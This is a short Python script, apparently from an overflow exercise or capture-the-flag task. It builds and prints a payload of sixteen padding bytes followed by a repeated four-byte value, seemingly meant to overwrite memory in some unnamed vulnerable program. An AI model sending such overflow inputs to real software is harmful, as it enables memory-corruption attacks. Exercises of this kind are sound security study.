payload=bytearray()

for i in range(16):
	payload.append('\x5e')

payload.append('\x4F')
payload.append('\x41')
payload.append('\x49')
payload.append('\x43')
payload.append('\x4F')
payload.append('\x41')
payload.append('\x49')
payload.append('\x43')
payload.append('\x4F')
payload.append('\x41')
payload.append('\x49')
payload.append('\x43')
payload.append('\x4F')
payload.append('\x41')
payload.append('\x49')
payload.append('\x43')

print(payload)
